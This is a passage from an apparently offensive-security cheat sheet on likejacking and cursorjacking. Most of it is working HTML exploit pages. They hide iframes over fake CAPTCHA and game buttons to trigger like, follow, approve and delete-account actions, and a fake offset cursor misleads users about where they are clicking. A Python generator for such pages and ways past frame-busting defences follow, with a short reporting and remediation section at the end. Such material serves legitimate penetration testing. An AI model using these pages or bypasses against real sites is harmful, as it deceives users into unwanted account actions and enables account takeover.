            background: url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" width="16" height="20"><path d="M0 0L0 16L5 12L8 19L10 18L7 11L12 11Z" fill="white" stroke="black" stroke-width="0.5"/></svg>') no-repeat;
        }
        .verification-box {
            background: #161b22;
            border: 1px solid #30363d;
            border-radius: 12px;
            padding: 40px;
            max-width: 400px;
            text-align: center;
        }
        .captcha-area {
            background: #21262d;
            border: 1px solid #30363d;
            border-radius: 8px;
            padding: 20px;
            margin: 20px 0;
            display: flex;
            align-items: center;
            gap: 15px;
        }
        .checkbox-fake {
            width: 28px;
            height: 28px;
            border: 2px solid #555;
            border-radius: 4px;
            cursor: none;
            position: relative;
        }
        .continue-btn {
            background: #1f6feb;
            color: white;
            border: none;
            padding: 12px 40px;
            border-radius: 6px;
            font-size: 16px;
            cursor: none;
            width: 100%;
        }
        /* Hidden Like button over the checkbox */
        .like-over-checkbox {
            position: absolute;
            top: 0;
            left: 0;
            width: 28px;
            height: 28px;
            opacity: 0;
            z-index: 50;
            border: none;
        }
        /* Hidden Follow button over Continue */
        .follow-container {
            position: relative;
        }
        .follow-over-btn {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            opacity: 0;
            z-index: 50;
            border: none;
        }
    </style>
</head>
<body>
    <div id="fakeCursor"></div>

    <div class="verification-box">
        <h2>🔐 Human Verification</h2>
        <p style="color:#8b949e; font-size:14px;">Complete the verification to continue</p>

        <div class="captcha-area">
            <div class="checkbox-fake" id="checkbox">
                <!-- Like button hidden over checkbox -->
                <iframe class="like-over-checkbox"
                    src="https://target.com/like?page=attacker_page"
                    scrolling="no"></iframe>
            </div>
            <span style="font-size:14px;">I'm not a robot</span>
        </div>

        <div class="follow-container">
            <button class="continue-btn">Continue to Website</button>
            <!-- Follow button hidden over Continue -->
            <iframe class="follow-over-btn"
                src="https://target.com/follow?user=attacker_account"
                scrolling="no"></iframe>
        </div>
    </div>

    <script>
        const fakeCursor = document.getElementById('fakeCursor');
        // Offset: fake cursor appears 150px right from real position
        document.addEventListener('mousemove', function(e) {
            fakeCursor.style.left = (e.clientX + 150) + 'px';
            fakeCursor.style.top = (e.clientY + 100) + 'px';
        });

        // Fake checkbox interaction
        document.getElementById('checkbox').addEventListener('click', function() {
            this.style.background = '#1f6feb';
            this.innerHTML = '<span style="color:white;font-size:18px;position:relative;z-index:1;">✓</span>' + this.innerHTML;
        });
    </script>
</body>
</html>
```

### Clickjacking to XSS Chain

```html [clickjack_to_xss.html]
<!DOCTYPE html>
<html>
<head>
    <title>Chained Attack</title>
    <style>
        body { background: #111; color: white; font-family: Arial, sans-serif; }
        .container {
            max-width: 600px;
            margin: 50px auto;
            text-align: center;
        }
        /* Step 1: Clickjack to make user paste XSS payload */
        .paste-trap {
            position: relative;
            display: inline-block;
        }
        .visible-input {
            padding: 15px;
            font-size: 16px;
            width: 400px;
            border: 1px solid #333;
            border-radius: 6px;
            background: #222;
            color: white;
        }
        /* Hidden iframe that receives the click/interaction */
        .hidden-iframe {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            opacity: 0;
            z-index: 10;
            border: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <h2>Search Our Database</h2>
        <p>Enter your query below:</p>
        <div class="paste-trap">
            <input class="visible-input" placeholder="Type your search...">
            <!--
                Hidden iframe loads a page with a text input that
                accepts the user's keystrokes. The iframe target has
                a reflected XSS vulnerability.
            -->
            <iframe class="hidden-iframe"
                src="https://target.com/search?q=">
            </iframe>
        </div>
    </div>
</body>
</html>
```

---

## Browser-Specific Techniques

### SVG Cursor Manipulation

```html [svg_cursor.html]
<!DOCTYPE html>
<html>
<head>
    <style>
        body {
            /* SVG custom cursor with offset hotspot */
            cursor: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='256' height='256'%3E%3Cpath d='M230 230 L230 246 L234 242 L237 248 L239 247 L236 241 L241 241 Z' fill='white' stroke='black'/%3E%3C/svg%3E") 0 0, auto;
            /*
             * The cursor arrow is drawn at position (230,230) within
             * a 256x256 canvas, but the hotspot is at (0,0).
             * Visual cursor appears ~230px away from actual click point.
             */
            background: #1a1a2e;
            color: white;
            font-family: Arial, sans-serif;
        }
        .target-area {
            padding: 100px;
            text-align: center;
        }
        .decoy-btn {
            padding: 20px 50px;
            font-size: 20px;
            background: #4ecdc4;
            color: #111;
            border: none;
            border-radius: 8px;
            /* Position where the USER thinks they click */
            margin-left: 230px;
            margin-top: 230px;
        }
        /* Real target positioned where actual cursor hotspot clicks */
        .real-action {
            position: fixed;
            top: 50px;
            left: 50px;
            opacity: 0.001;
        }
        .real-action iframe {
            border: none;
            width: 200px;
            height: 50px;
        }
    </style>
</head>
<body>
    <div class="target-area">
        <h1>Welcome!</h1>
        <button class="decoy-btn">Enter Website</button>
    </div>
    <div class="real-action">
        <iframe src="https://target.com/api/approve?request=attacker_access"></iframe>
    </div>
</body>
</html>
```

### Pointer Lock API Abuse

```html [pointer_lock.html]
<!DOCTYPE html>
<html>
<head>
    <title>3D Game Demo</title>
    <style>
        body {
            background: #000;
            color: white;
            font-family: Arial, sans-serif;
            margin: 0;
            overflow: hidden;
        }
        #gameCanvas {
            width: 100vw;
            height: 100vh;
            cursor: crosshair;
        }
        .start-screen {
            position: fixed;
            top: 0; left: 0;
            width: 100%; height: 100%;
            background: rgba(0,0,0,0.9);
            display: flex;
            justify-content: center;
            align-items: center;
            flex-direction: column;
            z-index: 100;
        }
        .start-btn {
            background: #e94560;
            color: white;
            border: none;
            padding: 20px 60px;
            font-size: 24px;
            border-radius: 10px;
            cursor: pointer;
        }
        .hidden-action {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            opacity: 0;
            z-index: 99;
        }
        .hidden-action iframe {
            border: none;
            width: 300px;
            height: 100px;
        }
    </style>
</head>
<body>
    <canvas id="gameCanvas"></canvas>

    <div class="start-screen" id="startScreen">
        <h1>🎯 FPS Game Demo</h1>
        <p>Click to start (pointer will be locked)</p>
        <button class="start-btn" onclick="startGame()">START GAME</button>
    </div>

    <div class="hidden-action" id="hiddenAction">
        <iframe src="https://target.com/api/delete-account?confirm=true"></iframe>
    </div>

    <script>
        function startGame() {
            const canvas = document.getElementById('gameCanvas');
            document.getElementById('startScreen').style.display = 'none';

            // Request pointer lock - cursor disappears
            canvas.requestPointerLock();

            canvas.addEventListener('click', function() {
                /*
                 * After pointer lock, the cursor is invisible and locked
                 * to the center. Clicks go to whatever is at center.
                 * Position the malicious iframe at center of screen.
                 */
                document.getElementById('hiddenAction').style.opacity = '0.001';
            });

            // Draw crosshair on canvas (fake game UI)
            const ctx = canvas.getContext('2d');
            canvas.width = window.innerWidth;
            canvas.height = window.innerHeight;

            function drawCrosshair() {
                ctx.clearRect(0, 0, canvas.width, canvas.height);
                const cx = canvas.width / 2;
                const cy = canvas.height / 2;
                ctx.strokeStyle = '#0f0';
                ctx.lineWidth = 2;
                ctx.beginPath();
                ctx.moveTo(cx - 20, cy); ctx.lineTo(cx + 20, cy);
                ctx.moveTo(cx, cy - 20); ctx.lineTo(cx, cy + 20);
                ctx.stroke();
                requestAnimationFrame(drawCrosshair);
            }
            drawCrosshair();
        }
    </script>
</body>
</html>
```

---

## Payload Generation & Automation

### Quick PoC Generator

```python [generate_poc.py]
#!/usr/bin/env python3
"""
Likejacking / Cursorjacking PoC Generator
Generates HTML exploit pages for testing
"""
import argparse
import html

def generate_likejack(target_url, bait_text="Click Here!", title="Special Offer"):
    return f"""<!DOCTYPE html>
<html>
<head>
    <title>{html.escape(title)}</title>
    <style>
        body {{
            background: #0d1117;
            color: white;
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }}
        .bait {{
            text-align: center;
            position: relative;
        }}
        .bait-btn {{
            background: #e94560;
            color: white;
            border: none;
            padding: 20px 60px;
            font-size: 22px;
            border-radius: 10px;
            cursor: pointer;
        }}
        .hidden-frame {{
            position: absolute;
            top: 0; left: 0;
            width: 100%; height: 100%;
            opacity: 0;
            z-index: 10;
            border: none;
        }}
    </style>
</head>
<body>
    <div class="bait">
        <h1>{html.escape(title)}</h1>
        <br>
        <div style="position:relative; display:inline-block;">
            <button class="bait-btn">{html.escape(bait_text)}</button>
            <iframe class="hidden-frame" src="{html.escape(target_url)}" scrolling="no"></iframe>
        </div>
    </div>
</body>
</html>"""

def generate_cursorjack(target_url, offset_x=200, offset_y=150):
    return f"""<!DOCTYPE html>
<html>
<head>
    <title>Verify Your Account</title>
    <style>
        body {{
            background: #111;
            color: white;
            font-family: Arial, sans-serif;
            cursor: none;
            margin: 0;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }}
        #fakeCursor {{
            position: fixed;
            pointer-events: none;
            z-index: 99999;
            width: 16px; height: 20px;
            background: url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" width="16" height="20"><path d="M0 0L0 16L5 12L8 19L10 18L7 11L12 11Z" fill="white" stroke="black" stroke-width="0.5"/></svg>') no-repeat;
        }}
        .real-target {{
            position: fixed;
            opacity: 0.001;
            z-index: 100;
            border: none;
            width: 200px;
            height: 60px;
        }}
        .decoy {{ text-align: center; }}
        .decoy button {{
            padding: 20px 50px;
            font-size: 20px;
            background: #238636;
            color: white;
            border: none;
            border-radius: 8px;
            cursor: none;
        }}
    </style>
</head>
<body>
    <div id="fakeCursor"></div>
    <div class="decoy">
        <h1>Click to Verify</h1>
        <button>Verify Now</button>
    </div>
    <iframe class="real-target" id="realTarget" src="{html.escape(target_url)}"></iframe>
    <script>
        const fc = document.getElementById('fakeCursor');
        const rt = document.getElementById('realTarget');
        document.addEventListener('mousemove', function(e) {{
            fc.style.left = (e.clientX + {offset_x}) + 'px';
            fc.style.top = (e.clientY + {offset_y}) + 'px';
            rt.style.left = (e.clientX - 10) + 'px';
            rt.style.top = (e.clientY - 10) + 'px';
        }});
    </script>
</body>
</html>"""

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Likejacking/Cursorjacking PoC Generator")
    parser.add_argument("-u", "--url", required=True, help="Target URL to frame")
    parser.add_argument("-t", "--type", choices=["likejack", "cursorjack"], default="likejack")
    parser.add_argument("-o", "--output", default="poc.html", help="Output file")
    parser.add_argument("--bait", default="Click Here!", help="Bait button text")
    parser.add_argument("--title", default="Special Offer", help="Page title")
    parser.add_argument("--offset-x", type=int, default=200, help="Cursor X offset")
    parser.add_argument("--offset-y", type=int, default=150, help="Cursor Y offset")
    args = parser.parse_args()

    if args.type == "likejack":
        poc = generate_likejack(args.url, args.bait, args.title)
    else:
        poc = generate_cursorjack(args.url, args.offset_x, args.offset_y)

    with open(args.output, "w") as f:
        f.write(poc)
    print(f"[+] PoC saved to {args.output}")
    print(f"[+] Serve with: python3 -m http.server 8080")
```

```bash [Usage Examples]
# Generate Likejacking PoC
python3 generate_poc.py -u "https://target.com/like?page=123" -t likejack -o likejack_poc.html

# Generate Cursorjacking PoC
python3 generate_poc.py -u "https://target.com/api/approve" -t cursorjack --offset-x 300 --offset-y 200 -o cursorjack_poc.html

# Serve the PoC
python3 -m http.server 8080

# Or use PHP built-in server
php -S 0.0.0.0:8080

# Or use Node.js
npx http-server -p 8080
```

### Batch Testing Script

```bash [batch_test.sh]
#!/bin/bash
# Test multiple endpoints for framing vulnerability

TARGET_DOMAIN="$1"
ENDPOINTS=(
    "/"
    "/login"
    "/dashboard"
    "/settings"
    "/profile"
    "/api/like"
    "/api/follow"
    "/api/share"
    "/oauth/authorize"
    "/account/delete"
)

echo "[*] Testing $TARGET_DOMAIN for Likejacking/Cursorjacking vulnerability"
echo "=================================================================="

for endpoint in "${ENDPOINTS[@]}"; do
    url="${TARGET_DOMAIN}${endpoint}"
    response=$(curl -sI -o /dev/null -w "%{http_code}" "$url" 2>/dev/null)

    if [ "$response" == "000" ]; then
        echo "[-] $url - Connection failed"
        continue
    fi

    headers=$(curl -sI "$url" 2>/dev/null)
    xfo=$(echo "$headers" | grep -i "x-frame-options" | tr -d '\r\n')
    csp_fa=$(echo "$headers" | grep -i "content-security-policy" | grep -oi "frame-ancestors[^;]*" | tr -d '\r\n')

    if [ -z "$xfo" ] && [ -z "$csp_fa" ]; then
        echo "[VULN] $url (HTTP $response) - NO FRAMING PROTECTION"
    elif [ -n "$xfo" ] && [ -n "$csp_fa" ]; then
        echo "[SAFE] $url - XFO: $xfo | CSP: $csp_fa"
    elif [ -n "$xfo" ]; then
        echo "[PARTIAL] $url - XFO: $xfo (no CSP frame-ancestors)"
    else
        echo "[PARTIAL] $url - CSP: $csp_fa (no XFO header)"
    fi
done
```

```bash [Run Batch Test]
chmod +x batch_test.sh
./batch_test.sh "https://target.com"
```

---

## Bypass Techniques

### Frame-Busting Bypass

When targets use JavaScript-based frame-busting instead of proper headers, these can often be bypassed.

::tabs
  :::tabs-item{icon="i-lucide-shield-off" label="Sandbox Bypass"}

  ```html [Bypass Frame-Buster with Sandbox]
  <!-- sandbox attribute disables JavaScript in the iframe -->
  <!-- This breaks JS-based frame-busting scripts -->

  <!-- Basic sandbox (blocks all scripts) -->
  <iframe sandbox src="https://target.com/like?page=123"
      style="opacity:0; position:absolute; z-index:10;"
      width="500" height="300">
  </iframe>

  <!-- Allow forms but block scripts -->
  <iframe sandbox="allow-forms" src="https://target.com/login"
      style="opacity:0; position:absolute; z-index:10;"
      width="500" height="300">
  </iframe>

  <!-- Allow forms and same-origin (needed for some actions) -->
  <iframe sandbox="allow-forms allow-same-origin" src="https://target.com/settings"
      style="opacity:0; position:absolute; z-index:10;"
      width="500" height="300">
  </iframe>

  <!-- Allow specific features -->
  <iframe sandbox="allow-forms allow-popups allow-same-origin"
      src="https://target.com/api/action"
      style="opacity:0; position:absolute; z-index:10;">
  </iframe>
  ```

  :::

  :::tabs-item{icon="i-lucide-shield-off" label="Double Framing"}

  ```html [Double Frame Bypass]
  <!--
    Some frame-busters check: if (top !== self)
    Double framing can confuse the check.
  -->

  <!-- outer.html -->
  <!DOCTYPE html>
  <html>
  <body>
      <iframe src="inner.html" width="100%" height="100%"
          style="border:none;"></iframe>
  </body>
  </html>

  <!-- inner.html -->
  <!DOCTYPE html>
  <html>
  <body>
      <iframe src="https://target.com/vulnerable-page"
          sandbox="allow-forms"
          style="opacity:0; position:absolute; top:0; left:0;
                 width:100%; height:100%; z-index:10; border:none;">
      </iframe>
      <button style="position:relative; z-index:1; padding:20px 50px;
                     font-size:20px;">
          Click Me!
      </button>
  </body>
  </html>
  ```

  :::

  :::tabs-item{icon="i-lucide-shield-off" label="onBeforeUnload Block"}

  ```html [Block Navigation Frame-Buster]
  <!--
    Some frame-busters redirect: top.location = self.location
    Block the redirect with onbeforeunload or history manipulation.
  -->

  <!DOCTYPE html>
  <html>
  <head>
      <script>
          // Method 1: Block navigation via onbeforeunload
          window.onbeforeunload = function() {
              return "Are you sure?";
          };

          // Method 2: Rapidly set location back
          var prevent = true;
          var originalLocation = window.location.href;
          setInterval(function() {
              if (prevent && window.location.href !== originalLocation) {
                  window.location.href = originalLocation;
              }
          }, 1);

          // Method 3: Override top (may work in some contexts)
          // var top = window;
      </script>
  </head>
  <body>
      <iframe src="https://target.com/page"
          style="opacity:0; position:absolute; z-index:10; border:none;"
          width="100%" height="100%">
      </iframe>
      <div style="position:relative; z-index:1;">
          <h1>Bait Content</h1>
          <button>Click Here</button>
      </div>
  </body>
  </html>
  ```

  :::

  :::tabs-item{icon="i-lucide-shield-off" label="XFO ALLOWFROM Bypass"}

  ```html [ALLOW-FROM Header Bypass]
  <!--
    X-Frame-Options: ALLOW-FROM is deprecated and
    NOT supported in modern Chrome, Firefox, Edge.
    If server only uses ALLOW-FROM (no CSP), it's still frameable
    in browsers that ignore this directive.
  -->

  <!-- Test if ALLOW-FROM is the only protection -->
  <!-- If so, modern browsers will ignore it and allow framing -->

  <!DOCTYPE html>
  <html>
  <body>
      <h2>Testing ALLOW-FROM bypass</h2>
      <iframe src="https://target.com/action-page"
          width="800" height="600"
          style="border:1px solid red;">
      </iframe>
      <!--
          If the iframe loads, ALLOW-FROM is the only protection
          and it's bypassed in modern browsers.
      -->
  </body>
  </html>
  ```

  :::
::

### CSP frame-ancestors Bypass Attempts

```bash [CSP Analysis & Bypass]
# Extract and analyze CSP header
curl -sI "https://target.com" | grep -i "content-security-policy"

# Common weak configurations:
# frame-ancestors *                          → Allows framing from anywhere
# frame-ancestors 'self' https://*.target.com → Subdomain takeover = bypass
# frame-ancestors 'self' https://trusted.com  → Compromise trusted.com = bypass
# Missing frame-ancestors entirely            → Frameable if no XFO

# Check for subdomain takeover opportunity
# If CSP: frame-ancestors 'self' *.target.com
# Find unclaimed subdomains:
subfinder -d target.com -silent | httpx -silent -status-code | grep -E "40[34]|NXDOMAIN"
amass enum -passive -d target.com | httpx -silent

# Check for open redirects on allowed domains
# If CSP: frame-ancestors 'self' https://trusted.com
# Find open redirect on trusted.com to load attacker content
```

---

## Detection for Defenders

### What Pentesters Should Document

::note
When reporting Likejacking or Cursorjacking vulnerabilities, provide clear evidence of exploitability, not just missing headers.
::

```bash [Evidence Collection]
# 1. Screenshot of missing headers
curl -sI "https://target.com/vulnerable-page" > headers_evidence.txt

# 2. Working PoC HTML file
# Save your exploit HTML and host it

# 3. Screen recording of the attack
# Use OBS, Kazam, or browser DevTools recorder

# 4. Impact demonstration
# Show what action can be performed (like, follow, delete, authorize)

# 5. Test across browsers
# Chrome, Firefox, Edge, Safari — document which work

# 6. Note authentication requirements
# Does the attack work against authenticated users?
# Cookie SameSite attribute matters
```

### Cookie SameSite Impact

```bash [SameSite Cookie Analysis]
# Check if cookies have SameSite attribute
curl -sI "https://target.com/login" -c - | grep -i "set-cookie"

# SameSite=Strict → Cookies NOT sent in iframe (attack fails for auth actions)
# SameSite=Lax    → Cookies sent for top-level GET only (POST actions fail)
# SameSite=None   → Cookies sent in all contexts (attack works)
# No SameSite     → Browser default (Lax in Chrome, None in others)

# Test with DevTools:
# 1. Open attacker page with iframe
# 2. Check DevTools > Network > target request
# 3. Verify if session cookies are included
# 4. Check DevTools > Console for SameSite warnings
```

---

## Tools & Resources

### Primary Tools

::field-group
  ::field{name="Burp Suite Clickbandit" type="string"}
  Built-in Burp Suite Professional tool that automatically generates clickjacking PoC pages. Navigate the target in Burp's embedded browser, click the button you want to hijack, and it creates the exploit HTML.
  `Burp Suite > Burp menu > Burp Clickbandit`
  ::

  ::field{name="clickjacking-tool (coffinxp)" type="string"}
  Automated clickjacking vulnerability tester and PoC generator.
  `https://github.com/coffinxp/clickjacking-tool`
  ::

  ::field{name="Jack (iframe tester)" type="string"}
  Simple clickjacking tester that checks if a URL can be framed.
  `https://github.com/sensepost/jack`
  ::

  ::field{name="CursorJack.js" type="string"}
  JavaScript library for cursor manipulation research and testing.
  ::

  ::field{name="Nuclei Templates" type="string"}
  Pre-built templates for detecting clickjacking vulnerabilities.
  `nuclei -tags clickjacking`
  ::

  ::field{name="Browser DevTools" type="string"}
  Use Elements panel to inspect iframe behavior, Network panel to check headers and cookie transmission, Console for CSP violation messages.
  ::
::

### Wordlists & References

::field-group
  ::field{name="OWASP Clickjacking" type="string"}
  `https://owasp.org/www-community/attacks/Clickjacking`
  ::

  ::field{name="PortSwigger Clickjacking" type="string"}
  `https://portswigger.net/web-security/clickjacking`
  ::

  ::field{name="HackTricks Clickjacking" type="string"}
  `https://book.hacktricks.wiki/en/pentesting-web/clickjacking.html`
  ::

  ::field{name="PayloadsAllTheThings" type="string"}
  `https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Clickjacking`
  ::

  ::field{name="CWE-1021" type="string"}
  Improper Restriction of Rendered UI Layers or Frames.
  `https://cwe.mitre.org/data/definitions/1021.html`
  ::

  ::field{name="Cursor Spoofing Research" type="string"}
  Original research by Eddy Bordi and Marcus Niemietz on UI redressing via cursor manipulation.
  ::
::

### Quick One-Liners

```bash [Useful Commands]
# Quick frameable check
curl -sI https://target.com | grep -iE "x-frame|frame-ancestors" || echo "FRAMEABLE"

# Mass check from URL list
cat urls.txt | while read u; do echo -n "$u: "; curl -sI "$u" | grep -ci "x-frame-options" | xargs -I{} sh -c '[ {} -eq 0 ] && echo "VULNERABLE" || echo "PROTECTED"'; done

# Generate and serve PoC instantly
echo '<iframe src="https://target.com" style="width:100%;height:100%;border:none;opacity:0.3;position:absolute;top:0;left:0;z-index:10;"></iframe><button style="position:relative;z-index:1;padding:20px 50px;font-size:20px;">Click Me</button>' > poc.html && python3 -m http.server 8080

# Burp Clickbandit via command line (export from Burp)
# File > Export Clickbandit > Save HTML

# Nuclei quick scan
echo "https://target.com" | nuclei -tags clickjacking -silent

# Check SameSite cookies
curl -sI "https://target.com" | grep -i "set-cookie" | grep -i "samesite"
```

---

## Methodology Checklist

::steps{level="4"}

#### Reconnaissance & Header Analysis

Check all target pages for `X-Frame-Options` and `Content-Security-Policy frame-ancestors` headers. Test different pages — protection may be inconsistent across endpoints. Check both authenticated and unauthenticated responses.

#### Identify High-Value Targets

Map pages with sensitive actions: like/follow/share buttons, account settings, permission grants, delete confirmations, payment authorizations, OAuth consent screens. These are prime targets for Likejacking and Cursorjacking.

#### Test Framing Capability

Create a simple iframe test page. Load each target URL in an iframe and verify it renders. Check if JavaScript frame-busting is present and attempt sandbox bypass. Note which browsers allow framing.

#### Assess Cookie Behavior

Verify if session cookies are sent within the iframe context. Check `SameSite` attribute on all authentication cookies. If `SameSite=Strict` or `SameSite=Lax`, POST-based actions in iframes will fail — document this limitation.

#### Build Likejacking PoC

Create a compelling bait page with hidden iframe overlay. Position the target action (like/follow button) precisely over the bait button. Test opacity values — use `0` or `0.0001` for production, use `0.3`–`0.5` for demonstration to the client.

#### Build Cursorjacking PoC

Implement cursor replacement using CSS `cursor: none` with a fake cursor element. Calculate appropriate offset values. Verify the visual deception is convincing. Test across different screen resolutions and browsers.

#### Test Bypass Techniques

If frame-busting JavaScript is present, attempt sandbox attribute bypass, double framing, and onBeforeUnload blocking. If `ALLOW-FROM` is used, test in modern browsers that ignore it. If CSP `frame-ancestors` allows subdomains, check for subdomain takeover.

#### Document & Report

Capture screenshots and screen recordings of successful exploitation. Provide the working PoC HTML file. Detail the exact user interaction required, the action performed, and the business impact. Include remediation recommendations: add `X-Frame-Options: DENY`, set `Content-Security-Policy: frame-ancestors 'none'`, implement `SameSite=Strict` on cookies, and use anti-CSRF tokens.

::